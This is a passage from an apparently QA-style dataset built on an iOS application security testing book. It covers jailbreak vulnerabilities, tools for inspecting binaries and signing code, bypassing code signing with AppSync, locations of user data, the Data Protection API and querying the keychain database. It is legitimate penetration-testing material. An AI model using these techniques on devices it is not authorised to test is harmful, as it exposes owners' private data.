vulnerabilities is a logic bug\n(CVE-2013-0979) in the lockdownd, service which when exploited, allows the permissions of arbitrary files\nto be changed. The jailbreak then exploits several weaknesses in the iOS kernel, the first of which existed\nin the IOUSBDeviceFamily driver (CVE-2013-0981) due to an issue that allowed arbitrary functions to be\ncalled from objects that resided in user space. A detailed write-up of the kernel vulnerabilities used in this\njailbreak has been provided by Azimuth (http://blog.azimuthsecurity.com/2013/02/from-usr-to-svc-\ndissecting-evasi0n.html), whereas a complete analysis of the userland portions are detailed by Accuvant\n(http://blog.accuvant.com/bthomasaccuvant/evasi0n- jailbreaks-userland-component/) and Quarkslab\n(http://blog.quarkslab.com/evasi0n-jailbreak-precisions-on-stage-3.html). The evad3rs team has\nalso previously documented its work in a HackInTheBox presentation\n(http://conference.hitb.org/hitbsecconf2013ams/materials/ D2T1%20-\n%20Pod2g,%20Planetbeing,%20Musclenerd%20and%20Pimskeks%20aka%20Evad3rs%20-\n%20Swiping%20Through%20Modern%20Security%20Features.pdf).\nevasi0n7 JAILBREAK\nThe evasi0n7 jailbreak was the second jailbreak to be released by the evad3rs team and affected iOS\nversions 7.0 through 7.1 beta 3 with the exception of the Apple TV. In a similar style to the earlier evasi0n\njailbreak, evasi0n7 used a series of impressive tricks to bypass the userland mitigations on the device. The\njailbreak was able to coerce afcd into accessing the root filesystem, evading the service’s sandbox profile\nby injecting a dynamic library, which used a code-signing bypass (CVE-2014-1273) to nullify the relevant\nsandbox functions. A chain of other vulnerabilities were used, including a vulnerability in\nCrashHouseKeeping (CVE-2014-1272), which was used to change the permissions on /dev/rdisk0s1s1 and\ngain write-access to the root filesystem by writing directly to the block device. After userland code\nexecution was achieved, an out-of-bounds array access vulnerability in the ptmx_get_ioctl (CVE-2014-\n1278) Input/Output Control (IOCTL) was used to elevate privileges. geohot published a detailed analysis\nof the userland portion of this jailbreak (http://geohot.com/e7writeup.html), and further analysis of the\nuserland and kernel exploits have been detailed by Braden Thomas and p0sixninja, respectively\n(http://theiphonewiki.com/wiki/Evasi0n7).\nBuilding a Test Environment\nAfter you have a jailbroken device, you are likely to want to set up your environment to build, test, and explore\niOS applications. This section details some of the tools you can use to build a basic test environment, gain access\nto the device as well as to the various locations of interest on the device, and the types of files that you may\nencounter.\nAccessing the Device\nYou will need to log on to your jailbroken device to explore both the device and its applications and build your\ntesting environment. The fastest way to access your device is to install the OpenSSH package\n(http://cydia.saurik.com/ package/openssh/) through Cydia (detailed in the following section). Predictably\nthis causes the OpenSSH service to be installed to the device, listening on all interfaces. To connect to the\nservice you can either join the device to your Wi-Fi network and SSH directly to it using the Wi-Fi interface, or\nconnect to the device over the USB using the USB multiplexing daemon. If your host operating system is not OS\nX, the latter of these options requires the usbmuxd service to be installed, as detailed in the “Installing\nApplications” section of this chapter. To forward a local TCP port over the USB connection, you can use the\ntcprelay .py script in the usbmuxd python client or alternatively using iproxy if your host operating system is\nLinux, as shown in the following examples.\nTo forward local port 2222 to port 22 on the iOS device using tcprelay.py:\n$ ./tcprelay.py 22:2222\nForwarding local port 2222 to remote port 22\nTo forward local port 2222 to port 22 on the iOS device using iproxy:\n$ iproxy 2222 22\nWhen the port forwarding is enabled, you can connect to the device simply by using SSH to connect to the port\nbeing forwarded on the localhost:\n$ ssh -p 2222 root@localhost\nEvery iOS device comes with a default password of “alpine” for the root and mobile user accounts, which you\ncan use to access the device over SSH. To avoid someone inadvertently accessing your device, you should change\nthese passwords after your first logon.\nBuilding a Basic Toolkit\nTools are an important part of any security professional’s arsenal and when assessing an iOS application,\ninstalling some basic tools can make your life a little easier. Some of these are relatively unique to iOS, whereas\nothers you may be more familiar with if you have had exposure to other UNIX-like systems.\nCydia\nCydia (https://cydia.saurik.com/) is an alternative to Apple’s App Store for jailbroken devices and is installed\nwith many of the jailbreak applications. Cydia comes in the form of an iOS application that provides a graphic\nuser interface to the popular Advanced Packaging Tool (APT). You may be familiar with APT as it is widely used\nfor package management in other UNIX-like systems such as Linux’s Debian distribution. Cydia allows you to\ninstall a variety of precompiled packages for your iOS device, including applications, extensions, and command-\nline tools. Software packages are bundled in the deb file format; you can download them from any Cydia\nrepository. Repositories can be configured using the Sources option within the Cydia user interface. Cydia\nprovides a window to install many of the other tools that you can use in your test environment, as detailed in\nthe following sections.\nBigBoss Recommended Tools\nWhen you first log on to your iOS device you will discover that many of the command-line tools that you may be\nused to finding on other UNIX-like systems are missing. This is because iOS is stripped back to the bare bones\nand includes only necessary tools used by the operating system and associated services. To make iOS a little\nmore user friendly you can install the BigBoss recommended tools package from\nhttp://apt.thebigboss.org/onepackage.php?bundleid=bigbosshackertools. This package does nothing itself\nbut has a number of useful dependencies registered against it, which means that these all get installed in one\nfell swoop. The package contains essential command-line utilities such as those included in the coreutils,\nsystem-cmds, and adv-cmds packages, all created as part of saurik’s Telesphoreo project\n(http://www.saurik.com/id/1). The BigBoss package also forces the install of the apt package; for those familiar\nwith Debian’s package management system, this provides the command-line tools to install, update, and remove\nother packages.\nApple’s CC Tools\nDuring the course of an iOS application assessment, you likely will need to analyze or manipulate the\napplication binary. Apple’s CC Tools project (http://www.opensource.apple.com/source/cctools/) provides an\nopen source toolkit to do exactly that, containing a number of utilities to parse, assemble, and link Mach-O\nbinaries (the file format used by iOS/OS X applications). If you do any development on a Mac you are likely\nfamiliar with many of these utilities because they come as part of the iOS and OS X development toolchain. CC\nTools can also be compiled under Linux when used as part of the iPhone-Dev project’s toolchain\n(https://code.google.com/p/iphone-dev/). The following sections briefly describe some of the tools contained\nin the toolchain, along with practical examples.\notool\notool, the object file-displaying tool, is the Swiss army knife of Mach-O binary analysis. It contains the\nnecessary functionality to parse the Mach-O file format and inspect the relevant properties of a binary or library.\nThe following examples describe how to use otool to extract assessment-relevant information from a decrypted\napplication binary (outputs truncated for brevity):\nInspect the Objective-C segment to reveal class and method names:\n$ otool -oV MAHHApp\nMAHHApp (architecture armv7):\nContents of (__DATA,__objc_classlist) section\n0000c034 0xc5cc _OBJC_CLASS_$_ViewController\nisa 0xc5e0 _OBJC_METACLASS_$_ViewController\nsuperclass 0x0\ncache 0x0\nvtable 0x0\ndata 0xc098 (struct class_ro_t *)\nflags 0x80\ninstanceStart 158\ninstanceSize 158\nivarLayout 0x0\nname 0xbab9 ViewController\nbaseMethods 0xc078 (struct method_list_t *)\nentsize 12\ncount 2\nname 0xb3f8 viewDidLoad\ntypes 0xbaff v8@0:4\nimp 0xafd1\nname 0xb404 didReceiveMemoryWarning\ntypes 0xbaff v8@0:4\nimp 0xb015\nbaseProtocols 0x0\nivars 0x0\nweakIvarLayout 0x0\nbaseProperties 0x0\nList the libraries used by the binary:\n$ otool -L MAHHApp\nMAHHApp (architecture armv7):\n/System/Library/Frameworks/CoreGraphics.framework/CoreGraphics\n(compatibility version 64.0.0, current version 600.0.0)\n/System/Library/Frameworks/UIKit.framework/UIKit (compatibility version\n1.0.0, current version 2935.137.0)\n/System/Library/Frameworks/Foundation.framework/Foundation\n(compatibility version 300.0.0, current version 1047.25.0)\n/usr/lib/libobjc.A.dylib (compatibility version 1.0.0, current version\n228.0.0)\n/usr/lib/libSystem.B.dylib (compatibility version 1.0.0, current version\n1198.0.0)\nList the symbols exported by a binary:\n$ otool -IV MAHHApp\nMAHHApp (architecture armv7):\nIndirect symbols for (__TEXT,__symbolstub1) 9 entries\naddress index name\n0x0000bfdc 111 _UIApplicationMain\n0x0000bfe0 103 _NSStringFromClass\n0x0000bfe4 113 _objc_autoreleasePoolPop\n0x0000bfe8 114 _objc_autoreleasePoolPush\n0x0000bfec 116 _objc_msgSendSuper2\n0x0000bff0 117 _objc_release\n0x0000bff4 118 _objc_retain\n0x0000bff8 119 _objc_retainAutoreleasedReturnValue\n0x0000bffc 120 _objc_storeStrong\nDisplay the short-form header information:\n$ otool -hV MAHHApp\nMAHHApp (architecture armv7):\nMach header\nmagic cputype cpusubtype caps filetype ncmds sizeofcmds\nflags\nMH_MAGIC ARM V7 0x00 EXECUTE 22 2212\nNOUNDEFS DYLDLINK TWOLEVEL PIE\nMAHHApp (architecture armv7s):\nMach header\nmagic cputype cpusubtype caps filetype ncmds sizeofcmds\nflags\nMH_MAGIC ARM V7S 0x00 EXECUTE 22 2212\nNOUNDEFS DYLDLINK TWOLEVEL PIE\nMAHHApp (architecture cputype (16777228) cpusubtype (0)):\nMach header\nmagic cputype cpusubtype caps filetype ncmds sizeofcmds\nflags\nMH_MAGIC_64 16777228 0 0x00 EXECUTE 22 2608\nNOUNDEFS DYLDLINK TWOLEVEL PIE\nDisplay the binary load commands:\n$ otool -l MAHHApp\nMAHHApp (architecture armv7):\nLoad command 0\ncmd LC_SEGMENT\ncmdsize 56\nsegname __PAGEZERO\nvmaddr 0x00000000\nvmsize 0x00004000\nfileoff 0\nfilesize 0\nmaxprot 0x00000000\ninitprot 0x00000000\nnsects 0\nflags 0x0\nnm\nThe nm utility can be used to display the symbol table of a binary or object file. When you use it against an\nunencrypted iOS application, it reveals the class and method names of the application, preceded by a + for class\nmethods and – for instance methods:\n$ nm MAHHApp\nMAHHApp (for architecture armv7):\n0000b368 s stub helpers\n0000b1f0 t -[AppDelegate .cxx_destruct]\n0000b058 t -[AppDelegate application:didFinishLaunchingWithOptions:]\n0000b148 t -[AppDelegate applicationDidBecomeActive:]\n0000b0e8 t -[AppDelegate applicationDidEnterBackground:]\n0000b118 t -[AppDelegate applicationWillEnterForeground:]\n0000b0b8 t -[AppDelegate applicationWillResignActive:]\n0000b178 t -[AppDelegate applicationWillTerminate:]\n0000b1c4 t -[AppDelegate setWindow:]\n0000b1a8 t -[AppDelegate window]\n0000b2c4 t -[MAHHClass dummyMethod]\n0000b21c t -[MAHHClass initWithFrame:]\n0000b014 t -[ViewController didReceiveMemoryWarning]\n0000afd0 t -[ViewController viewDidLoad]\nlipo\nOn occasion, you may be required to manipulate the architectures that are compiled into a binary. lipo allows\nyou to combine or remove architecture types from an application. This is discussed in greater detail within the\n“Analyzing iOS Binaries” section of this chapter. Here are a couple brief examples of how to use lipo:\nPrint the architectures in a binary:\n$ lipo -info MAHHApp\nArchitectures in the fat file: MAHHApp are: armv7 armv7s (cputype\n(16777228) cpusubtype (0))\nRemove all but the listed architecture types from a binary:\n$ lipo -thin <arch_type> -output MAHHApp-v7 MAHHApp\nDebuggers\nWhen you’re assessing an application, attaching a debugger can be a powerful technique for understanding the\napplication’s inner workings. A couple of debuggers work on iOS, and the one that works best for you will\ndepend upon what you are trying to debug and the resources available to you. If you have done any debugging\non UNIX-like platforms or debugged an iOS application under Xcode, you are likely familiar with the tools used\nfor debugging: gdb or lldb. We briefly discuss how to set up these debuggers under iOS as opposed to detailing\nhow to extensively use them.\nThe version of gdb in the default Cydia repositories does not work well with newer versions of iOS; indeed, it is\nsomewhat broken and not maintained. However, alternate repositories with custom compiled versions of gdb\nare available. The one we have had the most success with is maintained by pancake of radare and can be\ninstalled by adding radare’s Cydia repository as a source (http://cydia.radare.org).\nIf you do not have success with this version of gdb you can use Apple’s version that is distributed with Xcode, as\ndocumented by pod2g (http://www.pod2g.org/2012/02/working-gnu-debugger-on-ios-43.html). However,\nbecause Apple has transitioned to lldb, you must retrieve a copy from a previous version of Xcode, which you\ncan find in the iOS developer portal. The caveat is that these versions of gdb are limited to 32-bit devices. After\nyou have the required gdb binary, usually found under /Developer/Platforms/iPhoneOS\n.platform/Developer/usr/libexec/gdb/gdb-arm-apple-darwin, you must thin the binary to the required\narchitecture, which you can do using lipo:\n$ lipo -thin armv7 gdb-arm-apple-darwin -output gdb-arm7\nTools for Signing Binaries\nAll code running on an iOS device must be signed. Unless this requirement is explicitly disabled, it still applies\nto jailbroken devices to some extent. However, in the case of jailbroken devices the code signing verification has\nbeen relaxed to allow self-signed certificates. Therefore, when you modify a binary or build or upload tools to\nthe device, you must ensure that they are code signed to satisfy this requirement. To achieve this you can use a\ncouple of tools, namely codesign and ldid.\nApple provided the codesign tool and it is likely to be the one most OS X users are familiar with as it comes\nbundled with OS X. You can use this multi-purpose tool for creating, checking, or displaying the status of a code-\nsigned binary.\nTo sign or replace an existing signature, use the following command:\n$ codesign -v -fs \"CodeSignIdentity\" MAHHApp.app/\nMAHHApp.app/: replacing existing signature\nMAHHApp.app/: signed bundle with Mach-O universal (armv7 armv7s\n(16777228:0)) [com.mdsec.MAHHApp]\nTo display the code signature of an application:\n$ codesign -v -d MAHHApp.app\nExecutable=/MAHHApp.app/MAHHApp\nIdentifier=com.mdsec.MAHHApp\nFormat=bundle with Mach-O universal (armv7 armv7s (16777228:0))\nCodeDirectory v=20100 size=406 flags=0x0(none) hashes=14+3\nlocation=embedded\nSignature size=1557\nSigned Time=20 Jul 2014 22:29:52\nInfo.plist entries=30\nTeamIdentifier=not set\nSealed Resources version=2 rules=5 files=8\nInternal requirements count=2 size=296\nIf you do not have access to OS X fear not; saurik developed ldid as a pseudo-signing alternative\n(http://www.saurik.com/id/8) to codesign. ldid generates and applies the SHA1 hashes that are verified by the\niOS kernel when checking a code-signed binary, and it can be compiled for a number of platforms. To sign a\nbinary with ldid use the following command:\n$ ldid –S MAHHApp\nInstallipa\nThe normal process of installing an application to the device involves using the installd service, which\nindependently verifies the code signature of the application. During an application assessment, you may need to\ninstall an IPA package that isn’t code signed or where the signature has been invalidated. You can, however,\ncircumvent this process on jailbroken devices using ipainstaller\n(https://github.com/autopear/ipainstaller). Note that this requires the installation of AppSync, available\nfrom the Cydia repository http://cydia.appaddict.org, a Cydia substrate tweak that disables code signing\nwithin installd by hooking the MISValidateSignatureAndCopyInfo function where the signature verification is\nperformed. (Similar techniques will be detailed in Chapter 3, Attacking iOS Applications.) To install an\napplication, simply run ipainstaller against the IPA file from a root shell on the device:\n# ipainstaller Lab1.1a.ipa\nAnalyzing Lab1.1a.ipa...\nInstalling lab1.1a (v1.0)...\nInstalled lab1.1a (v1.0) successfully.\nExploring the Filesystem\nAlthough performing a mobile application assessment using a jailbroken device is always recommended, for\nvarious reasons this may not always be possible. On non-jailbroken devices you can still access certain portions\nof the filesystem, including the sandboxed area where applications are installed; this can facilitate some basic\ninvestigations into what, if any, persistent storage is being performed by the application. To access the\nfilesystem, the device must first be paired with a host computer, although this is relatively seamless to you we\nbriefly describe the process next.\nTo prevent unauthorized access to the device, iOS requires you to pair it with a desktop first. Without this\nprocess, you could connect a locked device to your computer using the USB connection and extract sensitive\nuser data. This would clearly be a huge security issue and would leave personal data at risk on lost or stolen\ndevices. The pairing process works by creating a trust relationship between the device and the client; this is\nachieved by the desktop and device exchanging a set of keys and certificates that are later used to establish and\nauthenticate an SSL channel through which subsequent communication is performed. Before iOS 7 the pairing\nprocess could be instigated simply by plugging the device into a compatible device, which need not necessarily\nbe a desktop, but also includes things like media players. iOS 7 introduced some added security by prompting\nthe user to trust the plugged-in device, thereby removing the likelihood of a user unwittingly pairing to an\nunknown device such as a public charging point. If the user trusts the desktop and then goes on to unlock the\ndevice, the aforementioned key exchange is initiated and creates a pairing record. This record is then stored on\nthe desktop and the device. The pairing record is never deleted from the device, which means that any\npreviously paired devices will always have access to the device’s filesystem and if the pairing record is\ncompromised, the attacker will also be afforded the same level of access. The pairing record also contains an\nescrow keybag, which is generated by the device and passed to the host during the first unlock. It contains a\ncopy of the protection class keys used by the device to encrypt data using the Data Protection API (discussed\nlater in this chapter). However, at a high level you should realize that the pairing record is a powerful resource\nthat can be used to access even encrypted files on the device. For further information on how this process\nworks, refer to the presentation by Mathieu Renard at http://2013.hackitoergosum.org/presentations/Day3-\n04.Hacking%20apple%20accessories%20to%20pown%20iDevices%20%E2%80%93%20Wake%20up%20Neo!%20Your%20phone%20got%20pwnd%20!%20by%20Mathieu%20GoToHack%20RENARD.pdf\nAfter the pairing completes, you will be able to mount the /dev/disk0s1s2 device, which gives you access to the\nthird-party resources such as applications, media, the SMS database, and other data stored under the\n/private/var mount point. You can use a number of tools to mount this filesystem on non-jailbroken devices;\npopular solutions include iExplorer (http://www.macroplant.com/iexplorer/) and iFunBox (http://www.i-\nfunbox.com/).\nIf you are using a jailbroken device the easiest way to get access to the whole of the device’s filesystem is to\ninstall SSH and log in as the root user as noted earlier in this chapter. During your explorations of the\nfilesystem, a number of locations are likely to be of interest, some of which are listed in Table 2.1.\nTable 2.1 Interesting Filesystem Locations\nDIRECTORY DESCRIPTION\n/Applications System applications\n/var/mobile/Applications Third-party applications\n/private/var/mobile/Library/Voicemail Voicemails\n/private/var/mobile/Library/SMS SMS data\n/private/var/mobile/Media/DCIM Photos\n/private/var/mobile/Media/Videos Videos\n/var/mobile/Library/AddressBook/AddressBook .sqlitedb Contacts database\nDuring your adventures in exploring the iOS filesystem, you’re likely to encounter a number of different file\ntypes, some of which you may be familiar with, and others that may be more alien or Apple specific.\nProperty Lists\nProperty lists are used as a form of data storage and are commonly used in the Apple ecosystem under the\n.plist file extension. The format is similar to XML and can be used to store serialized objects and key value\npairs. Application preferences are often stored in the /Library/Preferences directory (relative to the\napplication’s data directory) as property lists using the NSDefaults class.\nProperty lists can be parsed using the plutil utility as shown here:\n# plutil com.google.Authenticator.plist\n{\nOTPKeychainEntries = (\n);\nOTPVersionNumber = \"2.1.0\";\n}\nYou can store the property list file in a binary format; however, you can convert this to XML to allow easy\nediting using the following:\n$ plutil -convert xml1 com.google.Authenticator.plist\nTo convert the file back to the binary plist format, simply use the binary1 format:\n$ plutil -convert binary1 com.google.Authenticator.plist\nBinary Cookies\nBinary cookies can be created by the URL loading system or webview as part of an HTTP request in a similar\nway to standard desktop browsers. The cookies get stored on the device’s filesystem in a cookie jar and are\nfound in the /Library/Cookies directory (relative to the application sandbox) in the Cookies.binarycookies file.\nAs the name suggests, the cookies are stored in a binary format but can be parsed using the BinaryCookieReader\n.py script (http://securitylearn.net/wp-content/uploads/tools/iOS/BinaryCookieReader.py).\nSQLite Databases\nSQLite is widely used for client-side storage of data in mobile applications and you are almost certain to use it at\nsome point. SQLite allows developers to create a lightweight client-side database that can be queried using SQL,\nin a similar way to other mainstream databases such as MySQL and Oracle.\nYou can query SQLite databases using the sqlite3 client, available in saurik’s Cydia repository:\n# sqlite3 ./Databases.db\nSQLite version 3.7.13\nEnter \".help\" for instructions\nsqlite> .tables\nDatabases Origins\nUnderstanding the Data Protection API\nThe protection of data stored on a mobile device is perhaps one of the most important issues that an application\ndeveloper has to deal with. Protecting sensitive data stored client-side in a secure manner is imperative. Apple\nhas recognized this requirement and to facilitate secure storage it has provided developers with an API that uses\nthe built-in hardware encryption. Unfortunately, finding applications (even from large multinationals) that\nstore their sensitive data in cleartext is still common. The Register highlighted a good example of this in 2010\nwhen vulnerabilities in the Citigroup online banking application caused it to be pulled from the App Store:\n“In a letter, the U.S. banking giant said the Citi Mobile app saved user information in a hidden file that could\nbe used by attackers to gain unauthorized access to online accounts. Personal information stored in the file\ncould include account numbers, bill payments and security access codes. . . . ”\nCitigroup says its iPhone app puts customers at risk\n(http://www.theregister.co.uk/2010/07/27/\nciti_iphone_app_weakness/)\nAt a basic level, file encryption in iOS is achieved by generating a per-file encryption key. Each file encryption\nkey is then locked with a protection class that is assigned to it by the developer. The protection classes govern\nwhen the class keys are kept in memory and can be used to encrypt/decrypt the file encryption keys and by\nconsequence, the individual files. In devices with an A7 or later chip, the key management is performed by the\nSecure Enclave, maintaining the integrity of the data protection even if the kernel has been compromised. The\nData Protection system uses a Password-Based Key Derivation Function 2 (PBKDF2) algorithm to generate a\npasscode key, which uses a device-specific key known as the UID key and the user’s passcode as input. The UID\nkey itself cannot be accessed by software on the device; instead it is embedded in the device’s hardware-based\ncrypto accelerator. The UID key is also used to encrypt a static byte string to generate the device key; this key is\nthen used to encrypt all the protection class keys along with, in some cases, the passcode key. The passcode key\nis held in memory until the device is locked meaning that the keys that it encrypts are available only while the\ndevice is unlocked. Figure 2.4 summarizes this process, courtesy of the iOS Hackers Handbook.\nFigure 2.4 The data protection key hierarchy\nYou can assign the relevant protection class to individual files using the Data Protection API, which allows four\nlevels of filesystem protection. The classes are configurable by passing an extended attribute to the NSData or\nNSFileManager classes. The possible levels of protection are listed here:\nNo Protection—The file is not encrypted on the filesystem.\nComplete Protection—The file is encrypted on the filesystem and inaccessible when the device is locked.\nComplete Unless Open—The file is encrypted on the filesystem and inaccessible while closed. When a\ndevice is unlocked, an app can maintain an open handle to the file even after it is subsequently locked;\nhowever, during this time the file will not be encrypted.\nComplete Until First User Authentication—The file is encrypted on the filesystem and inaccessible\nuntil the device is unlocked for the first time. This helps offer some protection against attacks that require a\ndevice reboot.\nAs of iOS 7, files are created with the Complete Until First User unlock protection class by default. To apply one\nof the levels of protection, you must pass one of the extended attributes from Table 2.2 to either the NSData or\nNSFileManager class.\nTable 2.2 File Protection Classes\nNSDATA NSFILEMANAGER\nNSDataWritingFileProtectionNone NSFileProtectionNone\nNSDataWritingFileProtectionComplete NSFileProtectionComplete\nNSDataWritingFileProtectionCompleteUnlessOpen NSFileProtectionCompleteUnlessOpen\nNSDataWritingFileProtectionCompleteUntilFirstUserAuthentication NSFileProtectionCompleteUntilFirstUserAuthentication\nThe following code shows an example of how to set the protection class attribute on a file that is downloaded\nand stored in the documents directory:\n-(BOOL) getFile\n{\nNSString *fileURL = @\"https://www.mdsec.co.uk/pdfs/wahh-live.pdf\";\nNSURL *url = [NSURL URLWithString:fileURL];\nNSData *urlData = [NSData dataWithContentsOfURL:url];\nif ( urlData )\n{\nNSArray *paths =\nNSSearchPathForDirectoriesInDomains(NSDocumentDirectory,\nNSUserDomainMask,\nYES);\nNSString *documentsDirectory = [paths objectAtIndex:0];\nNSString *filePath = [NSString stringWithFormat:@\"%@/%@\",\ndocumentsDirectory,@\"wahh-live.pdf\"];\nNSError *error = nil;\n[urlData writeToFile:filePath\noptions:NSDataWritingFileProtectionComplete error:&error];\nreturn YES;\n}\nreturn NO;\n}\nIn this example the document is accessible only while the device is unlocked. The OS provides a 10-second\nwindow between locking the device and this file being unavailable. The following shows an attempt to access the\nfile while the device is locked:\n$ ls -al Documents/ total 372\ndrwxr-xr-x 2 mobile mobile 102 Jul 20 15:24 ./\ndrwxr-xr-x 6 mobile mobile 204 Jul 20 15:23 ../\n-rw-r--r-- 1 mobile mobile 379851 Jul 20 15:24 wahh-live.pdf\n$ strings Documents/wahh-live.pdf\nstrings: can't open file: Documents/wahh-live.pdf\n(Operation not permitted)\nYou apply a protection class to data stored on the device in a similar manner to the preceding example by\npassing the relevant attribute that best fits the requirement for file access.",
    "question": "What are the key security features of the iOS platform and how do they contribute to the overall security of iOS devices?",
    "summary": "iOS is a popular mobile platform targeted by hackers for application layer vulnerabilities. It includes security features like secure boot chain, code signing, and process-level sandboxing to protect devices and applications. This chapter explains how to analyze and test iOS applications, focusing on security models, code signing, sandboxing, and data protection mechanisms. It also covers the process of jailbreaking, the different types of jailbreaks, and tools used for testing and analyzing iOS applications."
  },
  {
    "start": 12,
    "end": 15,
    "text": "Understanding the iOS Keychain\nThe iOS keychain is an encrypted container used for storing sensitive data such as credentials, encryption keys,\nor certificates. In a similar way to the encryption of files, you can apply a protection level to keychain items\nusing the Data Protection API. The following list describes the available accessibility protection classes for\nkeychain items:\nkSecAttrAccessibleAlways—The keychain item is always accessible.\nkSecAttrAccessibleWhenUnlocked—The keychain item is accessible only when the device is unlocked.\nkSecAttrAccessibleAfterFirstUnlock—The keychain item is only accessible after the first unlock from boot.\nThis offers some protection against attacks that require a device reboot.\nkSecAttrAccessibleAlwaysThisDeviceOnly—The keychain item is always accessible but cannot be migrated\nto other devices.\nkSecAttrAccessibleWhenUnlockedThisDeviceOnly—The keychain item is only accessible when the device is\nunlocked and may not be migrated to other devices.\nkSecAttrAccessibleAfterFirstUnlockThisDeviceOnly—The keychain item is accessible after the first unlock\nfrom boot and may not be migrated to other devices.\nkSecAttrAccessibleWhenPasscodeSetThisDeviceOnly—Only allows you to store keychain items if a passcode\nis set on the device. These items are accessible only when a passcode is set; if the password is later unset,\nthey cannot be decrypted.\nYou can add keychain items using the SecItemAdd or update them using the SecItemUpdate methods, which\naccept one of the preceding attributes to define the protection class to apply. As of iOS 7, all keychain items are\ncreated with a protection class of kSecAttrAccessibleWhenUnlocked by default, which allows access to the\nkeychain item only when the device is unlocked. If a protection class is marked as ThisDeviceOnly, the keychain\nitem is nonmigratable; that is, it will not be synchronized to other devices or to iTunes backups. iOS 8\nintroduced a new protection class, kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly, that allows you to\ncreate keychain items that are accessible only when a passcode is set and the user has authenticated to the\ndevice. If a keychain item is stored using this protection class and the user later removes the passcode, the key\nprotecting these items is destroyed from the Secure Enclave, which prevents these items being decrypted again.\nTo prevent any application on the device from accessing the keychain items of other applications, access is\nrestricted by the entitlements they are granted. The keychain uses application identifiers stored in the keychain-\naccess-group entitlement of the provisioning profile for the application; a sample provisioning profile that\nallows keychain access only to that specific application’s keychain is shown here:\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\"\n\"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\">\n<dict>\n<key>keychain-access-group</key>\n<array>\n<string>$(AppIdentifierPrefix)com.mdsec.mahhapp</string>\n</array>\n</dict>\n</plist>\nSometimes applications need to share keychain items; a good example of this would be an organization with a\nsuite of applications that require single sign-on. This can be done by using a shared keychain group. Each of the\napplications must just simply have the same value set keychain group. As previously noted, the keychain uses\napplication identifiers to set the access groups; these are configured by the provisioning portal on the iOS\ndeveloper center, must be unique to that organization, and typically are done using a reverse top-level domain\n(TLD) format. As such, this control prevents a malicious developer attempting to create an App Store application\nwith another application’s keychain access group.\nAn application can add an item to the keychain using the SecItemAdd method; consider the following example\napp that wants to store a license key in the keychain and only requires access to the item when the device is\nunlocked:\n- (NSMutableDictionary *)getkeychainDict:(NSString *)service {\nreturn [NSMutableDictionary dictionaryWithObjectsAndKeys:\n(id)kSecClassGenericPassword, (id)kSecClass,\nservice,(id)kSecAttrService, service, (id)kSecAttrAccount,\n(id)kSecAttrAccessibleWhenUnlocked, (id)kSecAttrAccessible, nil];\n}\n- (BOOL) saveLicense:(NSString*)licenseKey {\nstatic NSString *serviceName = @\"com.mdsec.mahhapp\";\nNSMutableDictionary *myDict = [self getkeychainDict:serviceName];\nSecItemDelete((CFDictionaryRef)myDict);\nNSData *licenseData = [licenseKey dataUsingEncoding:\nNSUTF8StringEncoding];\n[myDict setObject:[NSKeyedArchiver archivedDataWithRootObject:\nlicenseData] forKey:(id)kSecValueData];\nOSStatus status = SecItemAdd((CFDictionaryRef)myDict, NULL);\nif (status == errSecSuccess) return YES;\nreturn NO;\n}\nThe application creates a dictionary of key-value pairs that are the configuration attributes for the keychain. In\nthis instance the application sets the kSecAttrAccessibleWhenUnlocked attribute to allow access to the keychain\nitem whenever the device is unlocked. The application then sets the kSecValueData attribute to the value of the\ndata that it wants to store in the keychain—in this instance the license key data—and adds the item to the\nkeychain using the SecItemAdd method.\nAccess Control and Authentication Policies in iOS 8\nIn addition to the accessibility protection classes for keychain items, Apple introduced the concept of access\ncontrol and authentication policies for iOS 8 applications. This new authentication policy controls what happens\nwhen a keychain item is accessed. Developers can now force the user to perform authentication by passcode or\nTouch ID before the keychain item can be accessed. This prompts the user with an authentication screen when\nthe keychain item is being accessed and by virtue should only be used for keychain items that require the device\nto be unlocked, as the user interface must be accessible. The access control policy is set by a new keychain\nattribute, kSecAttrAccessControl that is represented by the SecAccessControlRef object. To create the access\ncontrol policy for the keychain item, this object must be populated with the options that define the\nauthentication and accessibility that is required.\nThe authentication policy in iOS 8 defines what has to be done before the keychain item is decrypted and\nreturned to the application. Currently the only available authentication policy is the user presence\n(kSecAccessControlUserPresence) policy, which uses the Secure Enclave to determine which type of\nauthentication must be done. This policy prevents access to items when no passcode is set on the device, and\nrequires entry of the passcode. If a device passcode is set for devices supporting Touch ID and fingerprints are\nenrolled, this authentication method is preferred. If Touch ID is unavailable then a backup mechanism using\nthe device’s passcode is available. Table 2.3 summarizes the user presence policy.\nTable 2.3 User Presence Policy\nDEVICE CONFIGURATION POLICY EVALUATION BACKUP MECHANISM\nDevice without passcode No access No backup\nDevice with passcode Requires passcode entry No backup\nDevice with Touch ID Prefers Touch ID entry Allows passcode entry\nThe following code shows an example of how to add a keychain item using an access control policy. In this\nexample the keychain item is accessible only when the device has a passcode set and the user enters the device’s\npasscode or authenticates via Touch ID:\nCFErrorRef error = NULL;\nSecAccessControlRef sacObject =\nSecAccessControlCreateWithFlags(kCFAllocatorDefault,\nkSecAttrAccessibleWhenPasscodeSetThisDeviceOnly,\nkSecAccessControlUserPresence, &error);\nNSDictionary *attributes = @{\n(__bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,\n(__bridge id)kSecAttrService: @\"MAHHService\",\n(__bridge id)kSecValueData: [@\"secretpassword\" dataUsingEncoding:\nNSUTF8StringEncoding], (__bridge id)kSecUseNoAuthenticationUI: @YES,\n(__bridge id)kSecAttrAccessControl: (__bridge id)sacObject\n};\ndispatch_async(dispatch_get_global_queue( DISPATCH_QUEUE_PRIORITY_DEFAULT,\n0), ^(void){\nOSStatus status = SecItemAdd((__bridge CFDictionaryRef)attributes,\nnil);\n});\nFirst the SecAccessControlRef object is populated with the accessibility and access control options; this is then\nadded to the keychain using the methods previously described and using the global queue.\nAccessing the iOS Keychain\nUnder the hood, the keychain is simply a SQLite database stored in the /var/Keychains directory, and it can be\nqueried like any other database. For example, to find the list of the keychain groups execute the following query:\n# sqlite3 keychain-2.db \"select agrp from genp\"\ncom.apple.security.sos\napple\napple\napple\napple\nichat\ncom.mdsec.mahhapp\nmdsecios:/var/Keychains root#\nOn a jailbroken phone, you can dump all the keychain items for any application under the same caveats\npreviously detailed with the Data Protection API. You do it by creating an application that is assigned a 